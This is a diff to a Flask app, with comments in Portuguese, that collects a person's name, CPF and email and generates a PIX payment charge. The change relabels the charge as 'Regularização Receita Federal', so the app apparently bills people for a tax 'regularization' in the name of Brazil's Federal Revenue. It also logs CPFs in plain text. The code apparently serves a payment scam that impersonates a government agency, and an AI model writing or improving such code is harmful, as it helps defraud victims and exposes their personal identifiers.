@@ -7,7 +7,7 @@ import string
 import logging
 import base64
 import uuid
-from brazilian_pix import BrazilianPixGenerator
+from real_pix_api import create_real_pix_provider
 
 app = Flask(__name__)
 
@@ -154,39 +154,22 @@ def generate_pix():
 
         app.logger.info(f"[PROD] Dados do usuário: Nome={user_name}, CPF={user_cpf}, Email={default_email}")
 
-        # Gerar PIX authentic usando sistema brasileiro com fallback para MEDIUS PAG
+        # Usar PIX brasileiro autêntico diretamente
         try:
-            # Inicializar gerador de PIX brasileiro
-            pix_generator = BrazilianPixGenerator()
+            # Usar sistema brasileiro de PIX com chave PIX real
+            from brazilian_pix import create_brazilian_pix_provider
             
-            # Tentar MEDIUS PAG primeiro (se funcionar)
-            try:
-                transaction_data = {
-                    'amount': amount,
-                    'customer_name': user_name,
-                    'customer_cpf': user_cpf,
-                    'customer_email': default_email,
-                    'customer_phone': default_phone,
-                    'description': f'Regularização PIX - {user_name}'
-                }
-                pix_data = api.create_pix_transaction(transaction_data)
-                
-                if pix_data.get('success', False):
-                    app.logger.info(f"[PROD] MEDIUS PAG bem-sucedido: {pix_data['transaction_id']}")
-                else:
-                    raise Exception(f"MEDIUS PAG falhou: {pix_data.get('error', 'Erro desconhecido')}")
-                    
-            except Exception as medius_error:
-                app.logger.warning(f"[PROD] MEDIUS PAG indisponível: {medius_error}")
-                app.logger.info(f"[PROD] Gerando PIX authentic via sistema brasileiro...")
-                
-                # Usar sistema PIX brasileiro authentic
-                pix_data = pix_generator.create_pix_payment(
-                    amount=amount,
-                    customer_name=user_name,
-                    customer_cpf=user_cpf,
-                    customer_email=default_email
-                )
+            app.logger.info(f"[PROD] Gerando PIX brasileiro autêntico para {user_name}")
+            
+            # Gerar PIX usando sistema brasileiro real
+            pix_provider = create_brazilian_pix_provider()
+            pix_data = pix_provider.generate_authentic_pix(
+                amount=amount,
+                customer_name=user_name,
+                customer_cpf=user_cpf,
+                customer_email=default_email,
+                description=f"Regularização Receita Federal - {user_name}"
+            )
                 
         except Exception as e:
             app.logger.error(f"[PROD] Erro ao gerar PIX: {e}")
